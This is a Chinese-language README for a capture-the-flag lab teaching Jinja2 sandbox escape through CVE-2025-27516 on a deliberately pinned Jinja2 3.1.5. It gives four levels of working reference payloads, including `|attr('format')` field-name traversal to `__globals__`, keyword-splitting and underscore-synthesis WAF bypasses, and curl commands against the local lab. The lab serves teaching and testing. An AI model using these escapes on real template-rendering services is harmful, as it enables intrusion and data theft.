# 05 · Jinja2 沙箱逃逸

| | |
|---|---|
| 端口 | `8095`（`JINJA_SANDBOX_PORT` 可改） |
| 引擎 | Jinja2 沙箱（`SandboxedEnvironment` / `ImmutableSandboxedEnvironment`） |
| 关卡数 | 4（id `0`–`3`） |
| 依赖网络 | 否 |
| 固定版本 | **精确锁** `Jinja2==3.1.5`（3.1.4 上原语尚不存在，3.1.6 起被修复，两者都无解；见下文） |
| 逃逸原语 | **CVE-2025-27516**：`|attr('format')` → 未过沙箱的 `str.format` → 字段名 `{0.__globals__[key]}` 在 C 层解析 |
| flag | 容器内 `/flag`（entrypoint 写入）**同时**放一份在服务端内存 `SITEDATA['flag']`（教学装置，见下文） |

## 这个靶场在教什么

Jinja2 的沙箱**只封属性名**：所有以 `_` 开头的名字（`__class__` / `__globals__` /
`__subclasses__` …）一律拿不到。围绕这一条，本靶场教三件事：

1. **哪些写法真的被拦、哪些是过期知识。** 网上大量 writeup 里的「经典 `|attr` 链」
   `{{ ()|attr('__class__')|attr('__base__')|attr('__subclasses__')() }}` 在
   **Jinja2 2.11.3 之后就已经失效**（`do_attr` 会调用 `is_safe_attribute`），
   本靶场第一关就能亲手复现它失败。
2. **当前仍然有效的原语**：`str.format` 的字段名解析发生在 CPython 的 C 层，
   不经过 Jinja 的检查。`|attr('format')` 拿到的 `str.format` 是**没有**被沙箱包装的，
   于是 `{0.__globals__[SITEDATA]}` 这种字段名可以直接做属性遍历与取值
   —— 这就是 CVE-2025-27516。
3. **加压之后怎么办**：L3 用关键字子串黑名单、L4 用字符黑名单（`_`），
   逼你把过滤器名、字段名、甚至单个下划线在**运行期**拼出来。

`ImmutableSandboxedEnvironment`（L2）专门用来打掉一个常见误解：
**沙箱类名不同 ≠ 安全性不同**。它比默认沙箱只多挡了「修改内置可变对象」，
属性访问策略一模一样，L1 的逃逸一字不改照样成立。

## 关卡表

| id | 关卡 | 沙箱 | 额外 WAF | 关键思路 |
|----|------|------|----------|----------|
| 0 | L1 默认沙箱 | `SandboxedEnvironment` | — | `|attr('format')` → 未包装的 `str.format` → `{0.__globals__...}` 字段名遍历 |
| 1 | L2 不可变沙箱 | `ImmutableSandboxedEnvironment` | — | 同一原语；差别只在「修改」上（`[1,2,3].append(4)` 被拒） |
| 2 | L3 关键字子串黑名单 | `SandboxedEnvironment` | 子串 `format` `globals` `class` `subclasses` `mro` `builtins` `flag` | 关键字拆开用 `~` 拼；注意 `|` 优先级高于 `~`，要加括号 |
| 3 | L4 字符黑名单 | `SandboxedEnvironment` | 字符 `_` | `'%c'|format(95)` 在运行期造出 `_`，再拼出 `__globals__` |

## 参考解

下面每一条都由 `tests/test_sandbox_levels.py` 在容器里对 `Level.render(...)` 实跑并断言
（「✅ 已验证」= 真的跑过，输出就是右边写的那个）。

### L1（id 0）默认沙箱 ✅

先确认沙箱拦了什么：

```jinja2
{{ ''|attr('__class__') }}                                          → 空串（UnsafeUndefined）
{{ ()|attr('__class__')|attr('__base__')|attr('__subclasses__')() }} → [渲染异常] UndefinedError（经典 |attr 链已死）
```

逃逸原语与拿 flag（flag 在 `helper.__globals__` → `SITEDATA` 里）：

```jinja2
{{ ('{0.__class__}'|attr('format'))(()) }}                        → <class 'tuple'>
{{ ('{0.__globals__[SITEDATA]}'|attr('format'))(helper) }}       → {'flag': 'flag{...}', 'welcome': "abking's notes", 'version': '1.0.0'}
{{ ('{0.__globals__[SITEDATA][flag]}'|attr('format'))(helper) }} → flag{...}
```

读法：`|attr('format')` 拿到 `str.format`，后面那串是**格式字符串**。
`{0.__globals__[SITEDATA][flag]}` 的含义是「第 0 个参数（`helper`）的
`__globals__` 里取键 `SITEDATA`，再从里面取键 `flag`」——
`.` 是属性、`[x]` 是取值，全部由 CPython 在 C 层执行，Jinja 沙箱看不到。

### L2（id 1）不可变沙箱 ✅

```jinja2
{{ [1,2,3].append(4) }}
# L1（默认沙箱）  → 空串（执行成功，返回 None）
# L2（不可变沙箱）→ [渲染异常] SecurityError: access to attribute 'append' of 'list' object is unsafe.
```

逃逸与 L1 完全相同（`{{ ('{0.__globals__[SITEDATA][flag]}'|attr('format'))(helper) }}`）。
`ImmutableSandboxedEnvironment` 只额外调用 `modifies_known_mutable`，
把 list / set / dict / deque 的 `append` `clear` `pop` `remove` `update` `sort` `setdefault` …
判为不安全；`is_safe_attribute` 与调用策略一个字都没改。

### L3（id 2）关键字子串黑名单 ✅

命中即 `WAF`：

```jinja2
{{ ('{0.__globals__}'|attr('format'))(helper) }}   → WAF   （含 globals 子串）
```

把关键字拆开拼回来（`|attr` 的参数本来就是字符串）：

```jinja2
{{ (('{0.__glo'~'bals__[SITEDATA][fl'~'ag]}')|attr('for'~'mat'))(helper) }} → flag{...}
{{ (('{0.__cla'~'ss__}')|attr('for'~'mat'))(()) }}                          → <class 'tuple'>
```

⚠️ 易错点：Jinja 里过滤器 `|` 的优先级**高于**拼接 `~`，所以
`'a'~'b'|attr('format')` 会被解析成 `'a' ~ ('b'|attr('format'))`。
拼出来的整串格式字符串必须**用括号包住**再 `|attr(...)`。

### L4（id 3）字符黑名单：`_` ✅

```jinja2
{{ '__globals__' }}                    → WAF   （含 _）
{{ ('{0.'~'_'~'_'~'globals'~'_'~'_'~'}') }}   → WAF   （同上，编译前就被字符串匹配拦下）
```

下划线在运行期造出来（`|format` 是 printf 风格，`%c` 接码点，95 就是 `_`）：

```jinja2
{{ (('{0.'~('%c'|format(95))~('%c'|format(95))~'globals'~('%c'|format(95))~('%c'|format(95))~'[SITEDATA][flag]}')|attr('format'))(helper) }} → flag{...}
```

## 为什么精确锁定 Jinja2 3.1.5

本靶场**故意**装一个已知有漏洞的 Jinja2，并在 `app.py` 里做运行时自检。

版本边界很反直觉，下面是 `python:3.11-slim` + pip 逐条 payload 实测的结果
（逃逸探针用 `{{ ('{0.__class__}'|attr('format'))(()) }}`）：

| 版本 | 本靶场用的原语 | 教科书经典链 `\|attr('__class__')` | 本靶场可解？ |
|------|----------------|-----------------------------------|--------------|
| 3.1.4 | 失败：`SecurityError: access to attribute '__globals__' of 'function' object is unsafe.` | 失败（→ `UnsafeUndefined`） | ❌ **不可解** |
| **3.1.5** | `<class 'tuple'>` —— **逃逸成立** | 失败 | ✅ **唯一可解版本** |
| 3.1.6+ | 空串（被 `SandboxedFormatter` 拦下） | 失败 | ❌ 四关全部无解 |

⚠️ 所以 `requirements.txt` 写的是**精确锁** `Jinja2==3.1.5`，而不是
`>=3.1.4,<3.1.6` —— 后者在语义上把 3.1.4 也算作可用，但 3.1.4 上这四关同样无解
（失败原因不同：3.1.4 是原语尚不存在，3.1.6 是被修复）。

要点：

* `|attr('format')` 的绕过就是 **CVE-2025-27516**；**修复版本是 Jinja2 3.1.6**
  （访问 `format` / `format_map` 时不再直接返回内建方法，而是套一层
  `SandboxedFormatter`，字段名里的属性访问重新回到沙箱检查）。
* 教科书的「经典 `|attr` 链」在 2.11.3 之后就已经失效，**三个版本都拦得住**
  （`do_attr` 会调用 `is_safe_attribute`）。别把时间花在 `__class__` 上。
* `|attr('format')` 是这个版本里拿 `str.format` 的**唯一**入口（点号访问的
  `'{0.__class__}'.format(x)` 早就被 `wrap_str_format` 拦住了），
  所以 L3 **没有**去拦子串 `attr`：拦掉它这一关直接无解。L3 改拦关键字、
  L4 拦字符，都已实测绕过。
* 自检入口：容器起来后 `GET /api/sandbox/runtime` 返回
  `{"ok": true, "jinja2": "3.1.5", "cve": "CVE-2025-27516", "fixed_in": "3.1.6", "supported": ">=3.1.5,<3.1.6"}`；
  版本漂移时 `ok` 变 `false`，`/api/lab-info` 的 `description` 里也会提示，
  同时向 stderr 打一条醒目的警告。
* 同一条版本断言也在 `tests/test_sandbox_levels.py` 里（四关的参考解 + 被拦写法共 22 项）。
  **这个文件不进 CI 的快速单元任务**（那里装的是最新 Jinja2，断言必然打红），
  而是跑在专门的 `sandbox-cve` job 里 —— 该 job 精确安装 `Jinja2==3.1.5`，
  专门盯「原语还在不在」：Jinja2 一旦发新版或有人放宽 pin，CI 先红，
  而不是等玩家发现四关无解。本地/镜像内跑法：

  ```bash
  docker run --rm --entrypoint python -v "$PWD:/repo" -w /repo -e PYTHONPATH=shared \
      ssti-jinja-sandbox:local tests/test_sandbox_levels.py
  # 或者本地：pip install 'Jinja2==3.1.5' 后 PYTHONPATH=shared python tests/test_sandbox_levels.py
  ```
* 回滚办法：`pip install 'Jinja2==3.1.5'`，重建镜像即可。

## 这条原语能做什么、不能做什么

**能**：只读的属性遍历——把任意属性路径（含 `[key]` 取值、`{0.__globals__[名字]}`）
**打印成字符串**。因此 flag 必须放在「能被属性路径走到」的位置。

**不能**：

* 不能调用（`str.format` 只会把值格式化成字符串，字段名里没有「调用」这种语法），
  所以**做不到 RCE**，也读不到 `/flag` 文件；
* 正因如此，本靶场把 flag 同时以 `SITEDATA['flag']`（应用模块全局）的形式放进内存，
  再通过模板全局的业务回调 `helper` 暴露 `__globals__` 这条路——
  这是**教学装置**，不是真实场景的标准答案。真实场景里逃逸之后直接 RCE 读 `/flag`，
  那部分请去 `07-flask-memshell`（无沙箱、无回显、不出网，最终做内存马）。
* 版本常识：`|attr` / `|map(attribute=)` / 点号 / `str.format` 这一族从 Jinja2 2.11.3
  起就被沙箱检查过一遍，**2.11.3 之前写的沙箱逃逸 writeup 基本都已过期**。

日志里的 flag 一律不会主动回显：关卡描述、`/api/levels`、上帝模式的
`template_after_waf` 里都没有 flag，必须真的把逃逸 payload 打通才能拿到。

## 运行

```bash
# 1) 先构建统一前端镜像（只需一次）
scripts/build-frontend.sh            # Windows: scripts\build-frontend.ps1

# 2) 起本靶场
cd labs/05-jinja-sandbox
docker compose up --build            # → http://127.0.0.1:8095

# 或者用仓库根目录的编排一次起全部
docker compose up -d
```

## 直接调 API（不依赖前端）

```bash
curl -s localhost:8095/api/lab-info | jq '.levels[] | {id, title, waf}'
curl -s localhost:8095/api/sandbox/runtime | jq          # 版本自检（CVE 是否仍然有效）

# L1：先看经典链失败
curl -s -X POST localhost:8095/api/render -H 'Content-Type: application/json' \
     -d '{"level":"0","mode":"god","template":"{{ ()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__\")() }}"}' | jq

# L1：逃逸拿 flag
curl -s -X POST localhost:8095/api/render -H 'Content-Type: application/json' \
     -d '{"level":"0","template":"{{ (\"{0.__globals__[SITEDATA][flag]}\"|attr(\"format\"))(helper) }}"}' | jq

# L3：关键字拆分
curl -s -X POST localhost:8095/api/render -H 'Content-Type: application/json' \
     -d '{"level":"2","template":"{{ ((\"{0.__glo\"~\"bals__[SITEDATA][fl\"~\"ag]}\")|attr(\"for\"~\"mat\"))(helper) }}"}' | jq

# L4：运行期造下划线
curl -s -X POST localhost:8095/api/render -H 'Content-Type: application/json' \
     -d '{"level":"3","template":"{{ ((\"{0.\"~(\"%c\"|format(95))~(\"%c\"|format(95))~\"globals\"~(\"%c\"|format(95))~(\"%c\"|format(95))~\"[SITEDATA][flag]}\")|attr(\"format\"))(helper) }}"}' | jq
```

## 上帝模式（出题人视角）

`mode=god` 会额外返回：

| 字段 | 用途 |
|------|------|
| `template_after_waf` | 过滤/拼接之后的真实模板 —— 确认 WAF 到底怎么生效 |
| `raw_output` | 未经盲关包装的真实渲染结果 |
| `error` / `exception_type` | 区分「被 WAF 拦」（`output == "WAF"`）与「载荷语法错」（异常类型） |
| `source_class` | 触发渲染的关卡定义（`L01`…`L04`，定义在 `shared/ssti_core/levels/sandbox.py`） |

前端的 **关卡源码** 按钮会调 `/api/god/source`，直接显示那一关的
`Level(...)` 定义（含 `options={"sandbox": ...}` 与 `WafSpec`），
改过滤规则、复盘时比读文档快。

> 小提示：`/api/god/source` 返回的 `source_file` 字段由框架按引擎名拼成
> `shared/ssti_core/levels/jinja.py`（沙箱关卡实际在 `sandbox.py`），这是框架里的一处
> 硬编码，不影响 `source` 本身。
